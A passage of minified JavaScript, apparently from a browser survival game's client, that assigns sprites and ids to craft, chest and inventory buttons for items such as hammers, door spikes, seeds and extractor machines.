                    this.craft_buttons[u.HAMMER_GOLD].id = u.HAMMER_GOLD,
                    this.craft_buttons[u.HAMMER_DIAMOND] = be(60, 60, 0, sprite[ze.CRAFT_HAMMER_DIAMOND], 3),
                    this.craft_buttons[u.HAMMER_DIAMOND].id = u.HAMMER_DIAMOND,
                    this.craft_buttons[u.HAMMER_AMETHYST] = be(60, 60, 0, sprite[ze.CRAFT_HAMMER_AMETHYST], 3),
                    this.craft_buttons[u.HAMMER_AMETHYST].id = u.HAMMER_AMETHYST,
                    this.craft_buttons[u.HAMMER_REIDITE] = be(60, 60, 0, sprite[ze.CRAFT_HAMMER_REIDITE], 3),
                    this.craft_buttons[u.HAMMER_REIDITE].id = u.HAMMER_REIDITE,
                    this.craft_buttons[u.AMETHYST_WALL] = be(60, 60, 0, sprite[ze.CRAFT_AMETHYST_WALL], 3),
                    this.craft_buttons[u.AMETHYST_WALL].id = u.AMETHYST_WALL,
                    this.craft_buttons[u.AMETHYST_SPIKE] = be(60, 60, 0, sprite[ze.CRAFT_AMETHYST_SPIKE], 3),
                    this.craft_buttons[u.AMETHYST_SPIKE].id = u.AMETHYST_SPIKE,
                    this.craft_buttons[u.AMETHYST_DOOR] = be(60, 60, 0, sprite[ze.CRAFT_DOOR_AMETHYST_CLOSE], 3),
                    this.craft_buttons[u.AMETHYST_DOOR].id = u.AMETHYST_DOOR,
                    this.craft_buttons[u.CAP_SCARF] = be(60, 60, 0, sprite[ze.CRAFT_CAP_SCARF], 3),
                    this.craft_buttons[u.CAP_SCARF].id = u.CAP_SCARF,
                    this.craft_buttons[u.BLUE_CORD] = be(60, 60, 0, sprite[ze.CRAFT_BLUE_CORD], 3),
                    this.craft_buttons[u.BLUE_CORD].id = u.BLUE_CORD,
                    this.craft_buttons[u.LOCK] = be(60, 60, 0, sprite[ze.CRAFT_LOCK], 3),
                    this.craft_buttons[u.LOCK].id = u.LOCK,
                    this.craft_buttons[u.RESURRECTION] = be(60, 60, 0, sprite[ze.CRAFT_RESURRECTION], 3),
                    this.craft_buttons[u.RESURRECTION].id = u.RESURRECTION,
                    this.craft_buttons[u.LOCKPICK] = be(60, 60, 0, sprite[ze.CRAFT_LOCKPICK], 3),
                    this.craft_buttons[u.LOCKPICK].id = u.LOCKPICK,
                    this.craft_buttons[u.TOTEM] = be(60, 60, 0, sprite[ze.CRAFT_TOTEM], 3),
                    this.craft_buttons[u.TOTEM].id = u.TOTEM,
                    this.craft_buttons[u.AMETHYST_HELMET] = be(60, 60, 0, sprite[ze.CRAFT_AMETHYST_HELMET], 3),
                    this.craft_buttons[u.AMETHYST_HELMET].id = u.AMETHYST_HELMET,
                    this.craft_buttons[u.SUPER_HAMMER] = be(60, 60, 0, sprite[ze.CRAFT_SUPER_HAMMER], 3),
                    this.craft_buttons[u.SUPER_HAMMER].id = u.SUPER_HAMMER,
                    this.craft_buttons[u.BRIDGE] = be(60, 60, 0, sprite[ze.CRAFT_BRIDGE], 3),
                    this.craft_buttons[u.BRIDGE].id = u.BRIDGE,
                    this.craft_buttons[u.WOOD_TOWER] = be(60, 60, 0, sprite[ze.CRAFT_WOOD_TOWER], 3),
                    this.craft_buttons[u.WOOD_TOWER].id = u.WOOD_TOWER,
                    this.craft_buttons[u.BOAT] = be(60, 60, 0, sprite[ze.CRAFT_BOAT], 3),
                    this.craft_buttons[u.BOAT].id = u.BOAT,
                    this.craft_buttons[u.SLED] = be(60, 60, 0, sprite[ze.CRAFT_SLED], 3),
                    this.craft_buttons[u.SLED].id = u.SLED,
                    this.craft_buttons[u.PLANE] = be(60, 60, 0, sprite[ze.CRAFT_PLANE], 3),
                    this.craft_buttons[u.PLANE].id = u.PLANE,
                    this.craft_buttons[u.SADDLE] = be(60, 60, 0, sprite[ze.CRAFT_SADDLE], 3),
                    this.craft_buttons[u.SADDLE].id = u.SADDLE,
                    this.craft_buttons[u.MOUNT_BOAR] = be(60, 60, 0, sprite[ze.CRAFT_MOUNT_BOAR], 3),
                    this.craft_buttons[u.MOUNT_BOAR].id = u.MOUNT_BOAR,
                    this.craft_buttons[u.BABY_DRAGON] = be(60, 60, 0, sprite[ze.CRAFT_BABY_DRAGON], 3),
                    this.craft_buttons[u.BABY_DRAGON].id = u.BABY_DRAGON,
                    this.craft_buttons[u.BABY_MAMMOTH] = be(60, 60, 0, sprite[ze.CRAFT_BABY_MAMMOTH], 3),
                    this.craft_buttons[u.BABY_MAMMOTH].id = u.BABY_MAMMOTH,
                    this.craft_buttons[u.CRAB_BOSS] = be(60, 60, 0, sprite[ze.CRAFT_CRAB_BOSS], 3),
                    this.craft_buttons[u.CRAB_BOSS].id = u.CRAB_BOSS,
                    this.craft_buttons[u.BOTTLE_EMPTY] = be(60, 60, 0, sprite[ze.CRAFT_BOTTLE_EMPTY], 3),
                    this.craft_buttons[u.BOTTLE_EMPTY].id = u.BOTTLE_EMPTY,
                    this.craft_buttons[u.BOTTLE_FULL] = be(60, 60, 0, sprite[ze.CRAFT_BOTTLE_FULL], 3),
                    this.craft_buttons[u.BOTTLE_FULL].id = u.BOTTLE_FULL,
                    this.craft_buttons[u.BOTTLE_FULL_2] = be(60, 60, 0, sprite[ze.CRAFT_BOTTLE_FULL], 3),
                    this.craft_buttons[u.BOTTLE_FULL_2].id = u.BOTTLE_FULL_2,
                    this.craft_buttons[u.BOTTLE_FULL_3] = be(60, 60, 0, sprite[ze.CRAFT_BOTTLE_FULL], 3),
                    this.craft_buttons[u.BOTTLE_FULL_3].id = u.BOTTLE_FULL_3,
                    this.craft_buttons[u.SHOVEL] = be(60, 60, 0, sprite[ze.CRAFT_SHOVEL], 3),
                    this.craft_buttons[u.SHOVEL].id = u.SHOVEL,
                    this.craft_buttons[u.SHOVEL_GOLD] = be(60, 60, 0, sprite[ze.CRAFT_SHOVEL_GOLD], 3),
                    this.craft_buttons[u.SHOVEL_GOLD].id = u.SHOVEL_GOLD,
                    this.craft_buttons[u.SHOVEL_DIAMOND] = be(60, 60, 0, sprite[ze.CRAFT_SHOVEL_DIAMOND], 3),
                    this.craft_buttons[u.SHOVEL_DIAMOND].id = u.SHOVEL_DIAMOND,
                    this.craft_buttons[u.SHOVEL_AMETHYST] = be(60, 60, 0, sprite[ze.CRAFT_SHOVEL_AMETHYST], 3),
                    this.craft_buttons[u.SHOVEL_AMETHYST].id = u.SHOVEL_AMETHYST,
                    this.craft_buttons[u.SPANNER] = be(60, 60, 0, sprite[ze.CRAFT_SPANNER], 3),
                    this.craft_buttons[u.SPANNER].id = u.SPANNER,
                    this.craft_buttons[u.WATERING_CAN] = be(60, 60, 0, sprite[ze.CRAFT_WATERING_CAN], 3),
                    this.craft_buttons[u.WATERING_CAN].id = u.WATERING_CAN,
                    this.craft_buttons[u.WHEAT_SEED] = be(60, 60, 0, sprite[ze.CRAFT_WHEAT_SEED], 3),
                    this.craft_buttons[u.WHEAT_SEED].id = u.WHEAT_SEED,
                    this.craft_buttons[u.COOKIE] = be(60, 60, 0, sprite[ze.CRAFT_COOKIE], 3),
                    this.craft_buttons[u.COOKIE].id = u.COOKIE,
                    this.craft_buttons[u.WINDMILL] = be(60, 60, 0, sprite[ze.CRAFT_WINDMILL], 3),
                    this.craft_buttons[u.WINDMILL].id = u.WINDMILL,
                    this.craft_buttons[u.SUPER_DIVING_SUIT] = be(60, 60, 0, sprite[ze.CRAFT_SUPER_DIVING_SUIT], 3),
                    this.craft_buttons[u.SUPER_DIVING_SUIT].id = u.SUPER_DIVING_SUIT,
                    this.craft_buttons[u.DIVING_MASK] = be(60, 60, 0, sprite[ze.CRAFT_DIVING_MASK], 3),
                    this.craft_buttons[u.DIVING_MASK].id = u.DIVING_MASK,
                    this.craft_buttons[u.WATERING_CAN_FULL] = be(60, 60, 0, sprite[ze.CRAFT_WATERING_CAN_FULL], 3),
                    this.craft_buttons[u.WATERING_CAN_FULL].id = u.WATERING_CAN_FULL,
                    this.craft_buttons[u.CAKE] = be(60, 60, 0, sprite[ze.CRAFT_CAKE], 3),
                    this.craft_buttons[u.CAKE].id = u.CAKE,
                    this.craft_buttons[u.BREAD] = be(60, 60, 0, sprite[ze.CRAFT_BREAD], 3),
                    this.craft_buttons[u.BREAD].id = u.BREAD,
                    this.craft_buttons[u.FOODFISH_COOKED] = be(60, 60, 0, sprite[ze.CRAFT_FOODFISH_COOKED], 3),
                    this.craft_buttons[u.FOODFISH_COOKED].id = u.FOODFISH_COOKED,
                    this.craft_buttons[u.PLOT] = be(60, 60, 0, sprite[ze.CRAFT_PLOT], 3),
                    this.craft_buttons[u.PLOT].id = u.PLOT,
                    this.craft_buttons[u.BREAD_OVEN] = be(60, 60, 0, sprite[ze.CRAFT_BREAD_OVEN], 3),
                    this.craft_buttons[u.BREAD_OVEN].id = u.BREAD_OVEN,
                    this.craft_buttons[u.SANDWICH] = be(60, 60, 0, sprite[ze.CRAFT_SANDWICH], 3),
                    this.craft_buttons[u.SANDWICH].id = u.SANDWICH,
                    this.craft_buttons[u.DRAGON_HELMET] = be(60, 60, 0, sprite[ze.CRAFT_DRAGON_HELMET], 3),
                    this.craft_buttons[u.DRAGON_HELMET].id = u.DRAGON_HELMET,
                    this.craft_buttons[u.DRAGON_SWORD] = be(60, 60, 0, sprite[ze.INV_DRAGON_SWORD], 3),
                    this.craft_buttons[u.DRAGON_SWORD].id = u.DRAGON_SWORD,
                    this.craft_buttons[u.CROWN_GREEN] = be(60, 60, 0, sprite[ze.CRAFT_CROWN_GREEN], 3),
                    this.craft_buttons[u.CROWN_GREEN].id = u.CROWN_GREEN,
                    this.craft_buttons[u.CROWN_ORANGE] = be(60, 60, 0, sprite[ze.CRAFT_CROWN_ORANGE], 3),
                    this.craft_buttons[u.CROWN_ORANGE].id = u.CROWN_ORANGE,
                    this.craft_buttons[u.CROWN_BLUE] = be(60, 60, 0, sprite[ze.CRAFT_CROWN_BLUE], 3),
                    this.craft_buttons[u.CROWN_BLUE].id = u.CROWN_BLUE,
                    this.craft_buttons[u.HOOD] = be(60, 60, 0, sprite[ze.CRAFT_HOOD], 3),
                    this.craft_buttons[u.HOOD].id = u.HOOD,
                    this.craft_buttons[u.PEASANT] = be(60, 60, 0, sprite[ze.CRAFT_PEASANT], 3),
                    this.craft_buttons[u.PEASANT].id = u.PEASANT,
                    this.craft_buttons[u.WINTER_PEASANT] = be(60, 60, 0, sprite[ze.CRAFT_WINTER_PEASANT], 3),
                    this.craft_buttons[u.WINTER_PEASANT].id = u.WINTER_PEASANT,
                    this.craft_buttons[u.WINTER_HOOD] = be(60, 60, 0, sprite[ze.CRAFT_WINTER_HOOD], 3),
                    this.craft_buttons[u.WINTER_HOOD].id = u.WINTER_HOOD,
                    this.craft_buttons[u.BUCKET_FULL] = be(60, 60, 0, sprite[ze.CRAFT_BUCKET_FULL], 3),
                    this.craft_buttons[u.BUCKET_FULL].id = u.BUCKET_FULL,
                    this.craft_buttons[u.BUCKET_EMPTY] = be(60, 60, 0, sprite[ze.CRAFT_BUCKET_EMPTY], 3),
                    this.craft_buttons[u.BUCKET_EMPTY].id = u.BUCKET_EMPTY,
                    this.craft_buttons[u.WELL] = be(60, 60, 0, sprite[ze.CRAFT_WELL], 3),
                    this.craft_buttons[u.WELL].id = u.WELL,
                    this.craft_buttons[u.SIGN] = be(60, 60, 0, sprite[ze.CRAFT_SIGN], 3),
                    this.craft_buttons[u.SIGN].id = u.SIGN,
                    this.craft_buttons[u.PUMPKIN_SEED] = be(60, 60, 0, sprite[ze.CRAFT_PUMPKIN_SEED], 3),
                    this.craft_buttons[u.PUMPKIN_SEED].id = u.PUMPKIN_SEED,
                    this.craft_buttons[u.GARLIC_SEED] = be(60, 60, 0, sprite[ze.CRAFT_GARLIC_SEED], 3),
                    this.craft_buttons[u.GARLIC_SEED].id = u.GARLIC_SEED,
                    this.craft_buttons[u.ROOF] = be(60, 60, 0, sprite[ze.CRAFT_ROOF], 3),
                    this.craft_buttons[u.ROOF].id = u.ROOF,
                    this.craft_buttons[u.THORNBUSH_SEED] = be(60, 60, 0, sprite[ze.CRAFT_THORNBUSH_SEED], 3),
                    this.craft_buttons[u.THORNBUSH_SEED].id = u.THORNBUSH_SEED,
                    this.craft_buttons[u.TOMATO_SEED] = be(60, 60, 0, sprite[ze.CRAFT_TOMATO_SEED], 3),
                    this.craft_buttons[u.TOMATO_SEED].id = u.TOMATO_SEED,
                    this.craft_buttons[u.CARROT_SEED] = be(60, 60, 0, sprite[ze.CRAFT_CARROT_SEED], 3),
                    this.craft_buttons[u.CARROT_SEED].id = u.CARROT_SEED,
                    this.craft_buttons[u.WATERMELON_SEED] = be(60, 60, 0, sprite[ze.CRAFT_WATERMELON_SEED], 3),
                    this.craft_buttons[u.WATERMELON_SEED].id = u.WATERMELON_SEED,
                    this.craft_buttons[u.ALOE_VERA_SEED] = be(60, 60, 0, sprite[ze.CRAFT_ALOE_VERA_SEED], 3),
                    this.craft_buttons[u.ALOE_VERA_SEED].id = u.ALOE_VERA_SEED,
                    this.craft_buttons[u.WOOD_SPEAR] = be(60, 60, 0, sprite[ze.CRAFT_WOOD_SPEAR], 3),
                    this.craft_buttons[u.WOOD_SPEAR].id = u.WOOD_SPEAR,
                    this.craft_buttons[u.DRAGON_SPEAR] = be(60, 60, 0, sprite[ze.CRAFT_DRAGON_SPEAR], 3),
                    this.craft_buttons[u.DRAGON_SPEAR].id = u.DRAGON_SPEAR,
                    this.craft_buttons[u.CRAB_SPEAR] = be(60, 60, 0, sprite[ze.CRAFT_CRAB_SPEAR], 3),
                    this.craft_buttons[u.CRAB_SPEAR].id = u.CRAB_SPEAR,
                    this.craft_buttons[u.BED] = be(60, 60, 0, sprite[ze.CRAFT_BED], 3),
                    this.craft_buttons[u.BED].id = u.BED,
                    this.craft_buttons[u.CROWN_CRAB] = be(60, 60, 0, sprite[ze.CRAFT_CROWN_CRAB], 3),
                    this.craft_buttons[u.CROWN_CRAB].id = u.CROWN_CRAB,
                    this.chest_buttons[Be.PITCHFORK] = be(68, 68, 0, sprite[ze.CHEST_PITCHFORK], 3),
                    this.chest_buttons[Be.PITCHFORK].id = Be.PITCHFORK,
                    this.inv_buttons[Be.PITCHFORK] = be(60, 60, 0, sprite[ze.INV_PITCHFORK], 3),
                    this.inv_buttons[Be.PITCHFORK].id = Be.PITCHFORK,
                    this.craft_buttons[u.PITCHFORK] = be(60, 60, 0, sprite[ze.CRAFT_PITCHFORK], 3),
                    this.craft_buttons[u.PITCHFORK].id = u.PITCHFORK,
                    this.chest_buttons[Be.PITCHFORK2] = be(68, 68, 0, sprite[ze.CHEST_PITCHFORK2], 3),
                    this.chest_buttons[Be.PITCHFORK2].id = Be.PITCHFORK2,
                    this.inv_buttons[Be.PITCHFORK2] = be(60, 60, 0, sprite[ze.INV_PITCHFORK2], 3),
                    this.inv_buttons[Be.PITCHFORK2].id = Be.PITCHFORK2,
                    this.craft_buttons[u.PITCHFORK2] = be(60, 60, 0, sprite[ze.CRAFT_PITCHFORK2], 3),
                    this.craft_buttons[u.PITCHFORK2].id = u.PITCHFORK2,
                    this.chest_buttons[Be.MACHETE] = be(68, 68, 0, sprite[ze.CHEST_MACHETE], 3),
                    this.chest_buttons[Be.MACHETE].id = Be.MACHETE,
                    this.inv_buttons[Be.MACHETE] = be(60, 60, 0, sprite[ze.INV_MACHETE], 3),
                    this.inv_buttons[Be.MACHETE].id = Be.MACHETE,
                    this.craft_buttons[u.MACHETE] = be(60, 60, 0, sprite[ze.CRAFT_MACHETE], 3),
                    this.craft_buttons[u.MACHETE].id = u.MACHETE,
                    this.chest_buttons[Be.PILOT_HELMET] = be(68, 68, 0, sprite[ze.CHEST_PILOT_HELMET], 3),
                    this.chest_buttons[Be.PILOT_HELMET].id = Be.PILOT_HELMET,
                    this.inv_buttons[Be.PILOT_HELMET] = be(60, 60, 0, sprite[ze.INV_PILOT_HELMET], 3),
                    this.inv_buttons[Be.PILOT_HELMET].id = Be.PILOT_HELMET,
                    this.craft_buttons[u.PILOT_HELMET] = be(60, 60, 0, sprite[ze.CRAFT_PILOT_HELMET], 3),
                    this.craft_buttons[u.PILOT_HELMET].id = u.PILOT_HELMET,
                    this.chest_buttons[Be.PITCHFORK_PART] = be(68, 68, 0, sprite[ze.CHEST_PITCHFORK_PART], 3),
                    this.chest_buttons[Be.PITCHFORK_PART].id = Be.PITCHFORK_PART,
                    this.inv_buttons[Be.PITCHFORK_PART] = be(60, 60, 0, sprite[ze.INV_PITCHFORK_PART], 3),
                    this.inv_buttons[Be.PITCHFORK_PART].id = Be.PITCHFORK_PART,
                    this.chest_buttons[Be.SANDWORM_JUICE] = be(68, 68, 0, sprite[ze.CHEST_SANDWORM_JUICE], 3),
                    this.chest_buttons[Be.SANDWORM_JUICE].id = Be.SANDWORM_JUICE,
                    this.inv_buttons[Be.SANDWORM_JUICE] = be(60, 60, 0, sprite[ze.INV_SANDWORM_JUICE], 3),
                    this.inv_buttons[Be.SANDWORM_JUICE].id = Be.SANDWORM_JUICE,
                    this.chest_buttons[Be.PILOT_GLASSES] = be(68, 68, 0, sprite[ze.CHEST_PILOT_GLASSES], 3),
                    this.chest_buttons[Be.PILOT_GLASSES].id = Be.PILOT_GLASSES,
                    this.inv_buttons[Be.PILOT_GLASSES] = be(60, 60, 0, sprite[ze.INV_PILOT_GLASSES], 3),
                    this.inv_buttons[Be.PILOT_GLASSES].id = Be.PILOT_GLASSES,
                    this.chest_buttons[Be.EMERALD_MACHINE] = be(68, 68, 0, sprite[ze.CHEST_EMERALD_MACHINE], 3),
                    this.chest_buttons[Be.EMERALD_MACHINE].id = Be.EMERALD_MACHINE,
                    this.inv_buttons[Be.EMERALD_MACHINE] = be(60, 60, 0, sprite[ze.INV_EMERALD_MACHINE], 3),
                    this.inv_buttons[Be.EMERALD_MACHINE].id = Be.EMERALD_MACHINE,
                    this.craft_buttons[u.EMERALD_MACHINE] = be(60, 60, 0, sprite[ze.CRAFT_EMERALD_MACHINE], 3),
                    this.craft_buttons[u.EMERALD_MACHINE].id = u.EMERALD_MACHINE,
                    this.chest_buttons[Be.WOOD_DOOR_SPIKE] = be(68, 68, 0, sprite[ze.CHEST_WOOD_DOOR_SPIKE], 3),
                    this.chest_buttons[Be.WOOD_DOOR_SPIKE].id = Be.WOOD_DOOR_SPIKE,
                    this.inv_buttons[Be.WOOD_DOOR_SPIKE] = be(60, 60, 0, sprite[ze.INV_WOOD_DOOR_SPIKE], 3),
                    this.inv_buttons[Be.WOOD_DOOR_SPIKE].id = Be.WOOD_DOOR_SPIKE,
                    this.craft_buttons[u.WOOD_DOOR_SPIKE] = be(60, 60, 0, sprite[ze.CRAFT_WOOD_DOOR_SPIKE], 3),
                    this.craft_buttons[u.WOOD_DOOR_SPIKE].id = u.WOOD_DOOR_SPIKE,
                    this.chest_buttons[Be.STONE_DOOR_SPIKE] = be(68, 68, 0, sprite[ze.CHEST_STONE_DOOR_SPIKE], 3),
                    this.chest_buttons[Be.STONE_DOOR_SPIKE].id = Be.STONE_DOOR_SPIKE,
                    this.inv_buttons[Be.STONE_DOOR_SPIKE] = be(60, 60, 0, sprite[ze.INV_STONE_DOOR_SPIKE], 3),
                    this.inv_buttons[Be.STONE_DOOR_SPIKE].id = Be.STONE_DOOR_SPIKE,
                    this.craft_buttons[u.STONE_DOOR_SPIKE] = be(60, 60, 0, sprite[ze.CRAFT_STONE_DOOR_SPIKE], 3),
                    this.craft_buttons[u.STONE_DOOR_SPIKE].id = u.STONE_DOOR_SPIKE,
                    this.chest_buttons[Be.GOLD_DOOR_SPIKE] = be(68, 68, 0, sprite[ze.CHEST_GOLD_DOOR_SPIKE], 3),
                    this.chest_buttons[Be.GOLD_DOOR_SPIKE].id = Be.GOLD_DOOR_SPIKE,
                    this.inv_buttons[Be.GOLD_DOOR_SPIKE] = be(60, 60, 0, sprite[ze.INV_GOLD_DOOR_SPIKE], 3),
                    this.inv_buttons[Be.GOLD_DOOR_SPIKE].id = Be.GOLD_DOOR_SPIKE,
                    this.craft_buttons[u.GOLD_DOOR_SPIKE] = be(60, 60, 0, sprite[ze.CRAFT_GOLD_DOOR_SPIKE], 3),
                    this.craft_buttons[u.GOLD_DOOR_SPIKE].id = u.GOLD_DOOR_SPIKE,
                    this.chest_buttons[Be.DIAMOND_DOOR_SPIKE] = be(68, 68, 0, sprite[ze.CHEST_DIAMOND_DOOR_SPIKE], 3),
                    this.chest_buttons[Be.DIAMOND_DOOR_SPIKE].id = Be.DIAMOND_DOOR_SPIKE,
                    this.inv_buttons[Be.DIAMOND_DOOR_SPIKE] = be(60, 60, 0, sprite[ze.INV_DIAMOND_DOOR_SPIKE], 3),
                    this.inv_buttons[Be.DIAMOND_DOOR_SPIKE].id = Be.DIAMOND_DOOR_SPIKE,
                    this.craft_buttons[u.DIAMOND_DOOR_SPIKE] = be(60, 60, 0, sprite[ze.CRAFT_DIAMOND_DOOR_SPIKE], 3),
                    this.craft_buttons[u.DIAMOND_DOOR_SPIKE].id = u.DIAMOND_DOOR_SPIKE,
                    this.chest_buttons[Be.AMETHYST_DOOR_SPIKE] = be(68, 68, 0, sprite[ze.CHEST_AMETHYST_DOOR_SPIKE], 3),
                    this.chest_buttons[Be.AMETHYST_DOOR_SPIKE].id = Be.AMETHYST_DOOR_SPIKE;
                this.inv_buttons[Be.AMETHYST_DOOR_SPIKE] = be(60, 60, 0, sprite[ze.INV_AMETHYST_DOOR_SPIKE], 3),
                    this.inv_buttons[Be.AMETHYST_DOOR_SPIKE].id = Be.AMETHYST_DOOR_SPIKE,
                    this.craft_buttons[u.AMETHYST_DOOR_SPIKE] = be(60, 60, 0, sprite[ze.CRAFT_AMETHYST_DOOR_SPIKE], 3),
                    this.craft_buttons[u.AMETHYST_DOOR_SPIKE].id = u.AMETHYST_DOOR_SPIKE,
                    this.chest_buttons[Be.REIDITE_DOOR_SPIKE] = be(68, 68, 0, sprite[ze.CHEST_REIDITE_DOOR_SPIKE], 3),
                    this.chest_buttons[Be.REIDITE_DOOR_SPIKE].id = Be.REIDITE_DOOR_SPIKE,
                    this.inv_buttons[Be.REIDITE_DOOR_SPIKE] = be(60, 60, 0, sprite[ze.INV_REIDITE_DOOR_SPIKE], 3),
                    this.inv_buttons[Be.REIDITE_DOOR_SPIKE].id = Be.REIDITE_DOOR_SPIKE,
                    this.craft_buttons[u.REIDITE_DOOR_SPIKE] = be(60, 60, 0, sprite[ze.CRAFT_REIDITE_DOOR_SPIKE], 3),
                    this.craft_buttons[u.REIDITE_DOOR_SPIKE].id = u.REIDITE_DOOR_SPIKE,
                    this.chest_buttons[Be.REIDITE_WALL] = be(68, 68, 0, sprite[ze.CHEST_REIDITE_WALL], 3),
                    this.chest_buttons[Be.REIDITE_WALL].id = Be.REIDITE_WALL,
                    this.inv_buttons[Be.REIDITE_WALL] = be(60, 60, 0, sprite[ze.INV_REIDITE_WALL], 3),
                    this.inv_buttons[Be.REIDITE_WALL].id = Be.REIDITE_WALL,
                    this.craft_buttons[u.REIDITE_WALL] = be(60, 60, 0, sprite[ze.CRAFT_REIDITE_WALL], 3),
                    this.craft_buttons[u.REIDITE_WALL].id = u.REIDITE_WALL,
                    this.chest_buttons[Be.REIDITE_SPIKE] = be(68, 68, 0, sprite[ze.CHEST_REIDITE_SPIKE], 3),
                    this.chest_buttons[Be.REIDITE_SPIKE].id = Be.REIDITE_SPIKE,
                    this.inv_buttons[Be.REIDITE_SPIKE] = be(60, 60, 0, sprite[ze.INV_REIDITE_SPIKE], 3),
                    this.inv_buttons[Be.REIDITE_SPIKE].id = Be.REIDITE_SPIKE,
                    this.craft_buttons[u.REIDITE_SPIKE] = be(60, 60, 0, sprite[ze.CRAFT_REIDITE_SPIKE], 3),
                    this.craft_buttons[u.REIDITE_SPIKE].id = u.REIDITE_SPIKE,
                    this.chest_buttons[Be.REIDITE_DOOR] = be(68, 68, 0, sprite[ze.CHEST_REIDITE_DOOR], 3),
                    this.chest_buttons[Be.REIDITE_DOOR].id = Be.REIDITE_DOOR,
                    this.inv_buttons[Be.REIDITE_DOOR] = be(60, 60, 0, sprite[ze.INV_REIDITE_DOOR], 3),
                    this.inv_buttons[Be.REIDITE_DOOR].id = Be.REIDITE_DOOR,
                    this.craft_buttons[u.REIDITE_DOOR] = be(60, 60, 0, sprite[ze.CRAFT_REIDITE_DOOR], 3),
                    this.craft_buttons[u.REIDITE_DOOR].id = u.REIDITE_DOOR,
                    this.chest_buttons[Be.EXTRACTOR_MACHINE_STONE] = be(68, 68, 0, sprite[ze.CHEST_EXTRACTOR_MACHINE_STONE], 3),
                    this.chest_buttons[Be.EXTRACTOR_MACHINE_STONE].id = Be.EXTRACTOR_MACHINE_STONE,
                    this.inv_buttons[Be.EXTRACTOR_MACHINE_STONE] = be(60, 60, 0, sprite[ze.INV_EXTRACTOR_MACHINE_STONE], 3),
                    this.inv_buttons[Be.EXTRACTOR_MACHINE_STONE].id = Be.EXTRACTOR_MACHINE_STONE,
                    this.craft_buttons[u.EXTRACTOR_MACHINE_STONE] = be(60, 60, 0, sprite[ze.CRAFT_EXTRACTOR_MACHINE_STONE], 3),
                    this.craft_buttons[u.EXTRACTOR_MACHINE_STONE].id = u.EXTRACTOR_MACHINE_STONE,
                    this.chest_buttons[Be.EXTRACTOR_MACHINE_GOLD] = be(68, 68, 0, sprite[ze.CHEST_EXTRACTOR_MACHINE_GOLD], 3),
                    this.chest_buttons[Be.EXTRACTOR_MACHINE_GOLD].id = Be.EXTRACTOR_MACHINE_GOLD,
                    this.inv_buttons[Be.EXTRACTOR_MACHINE_GOLD] = be(60, 60, 0, sprite[ze.INV_EXTRACTOR_MACHINE_GOLD], 3),
                    this.inv_buttons[Be.EXTRACTOR_MACHINE_GOLD].id = Be.EXTRACTOR_MACHINE_GOLD,
                    this.craft_buttons[u.EXTRACTOR_MACHINE_GOLD] = be(60, 60, 0, sprite[ze.CRAFT_EXTRACTOR_MACHINE_GOLD], 3),
                    this.craft_buttons[u.EXTRACTOR_MACHINE_GOLD].id = u.EXTRACTOR_MACHINE_GOLD,
                    this.chest_buttons[Be.EXTRACTOR_MACHINE_DIAMOND] = be(68, 68, 0, sprite[ze.CHEST_EXTRACTOR_MACHINE_DIAMOND], 3),
                    this.chest_buttons[Be.EXTRACTOR_MACHINE_DIAMOND].id = Be.EXTRACTOR_MACHINE_DIAMOND,
                    this.inv_buttons[Be.EXTRACTOR_MACHINE_DIAMOND] = be(60, 60, 0, sprite[ze.INV_EXTRACTOR_MACHINE_DIAMOND], 3),
                    this.inv_buttons[Be.EXTRACTOR_MACHINE_DIAMOND].id = Be.EXTRACTOR_MACHINE_DIAMOND,
                    this.craft_buttons[u.EXTRACTOR_MACHINE_DIAMOND] = be(60, 60, 0, sprite[ze.CRAFT_EXTRACTOR_MACHINE_DIAMOND], 3),
                    this.craft_buttons[u.EXTRACTOR_MACHINE_DIAMOND].id = u.EXTRACTOR_MACHINE_DIAMOND,
                    this.chest_buttons[Be.EXTRACTOR_MACHINE_AMETHYST] = be(68, 68, 0, sprite[ze.CHEST_EXTRACTOR_MACHINE_AMETHYST], 3),
                    this.chest_buttons[Be.EXTRACTOR_MACHINE_AMETHYST].id = Be.EXTRACTOR_MACHINE_AMETHYST,
                    this.inv_buttons[Be.EXTRACTOR_MACHINE_AMETHYST] = be(60, 60, 0, sprite[ze.INV_EXTRACTOR_MACHINE_AMETHYST], 3),
                    this.inv_buttons[Be.EXTRACTOR_MACHINE_AMETHYST].id = Be.EXTRACTOR_MACHINE_AMETHYST,
                    this.craft_buttons[u.EXTRACTOR_MACHINE_AMETHYST] = be(60, 60, 0, sprite[ze.CRAFT_EXTRACTOR_MACHINE_AMETHYST], 3),
                    this.craft_buttons[u.EXTRACTOR_MACHINE_AMETHYST].id = u.EXTRACTOR_MACHINE_AMETHYST,
                    this.chest_buttons[Be.EXTRACTOR_MACHINE_REIDITE] = be(68, 68, 0, sprite[ze.CHEST_EXTRACTOR_MACHINE_REIDITE], 3),
                    this.chest_buttons[Be.EXTRACTOR_MACHINE_REIDITE].id = Be.EXTRACTOR_MACHINE_REIDITE,
                    this.inv_buttons[Be.EXTRACTOR_MACHINE_REIDITE] = be(60, 60, 0, sprite[ze.INV_EXTRACTOR_MACHINE_REIDITE], 3),
                    this.inv_buttons[Be.EXTRACTOR_MACHINE_REIDITE].id = Be.EXTRACTOR_MACHINE_REIDITE,
                    this.craft_buttons[u.EXTRACTOR_MACHINE_REIDITE] = be(60, 60, 0, sprite[ze.CRAFT_EXTRACTOR_MACHINE_REIDITE], 3),
                    this.craft_buttons[u.EXTRACTOR_MACHINE_REIDITE].id = u.EXTRACTOR_MACHINE_REIDITE,
                    this.chest_buttons[Be.FLAME] = be(68, 68, 0, sprite[ze.CHEST_FLAME], 3),
                    this.chest_buttons[Be.FLAME].id = Be.FLAME,
                    this.inv_buttons[Be.FLAME] = be(60, 60, 0, sprite[ze.INV_FLAME], 3),
                    this.inv_buttons[Be.FLAME].id = Be.FLAME,
                    this.inv_buttons[Be.FLAME].info.img[2] = this.inv_buttons[Be.FLAME].info.img[0],
                    this.chest_buttons[Be.LAVA_HEART] = be(68, 68, 0, sprite[ze.CHEST_LAVA_HEART], 3),
                    this.chest_buttons[Be.LAVA_HEART].id = Be.LAVA_HEART,
                    this.inv_buttons[Be.LAVA_HEART] = be(60, 60, 0, sprite[ze.INV_LAVA_HEART], 3),
                    this.inv_buttons[Be.LAVA_HEART].id = Be.LAVA_HEART,
                    this.inv_buttons[Be.LAVA_HEART].info.img[2] = this.inv_buttons[Be.LAVA_HEART].info.img[0],
                    this.chest_buttons[Be.REIDITE] = be(68, 68, 0, sprite[ze.CHEST_REIDITE], 3),
                    this.chest_buttons[Be.REIDITE].id = Be.REIDITE,
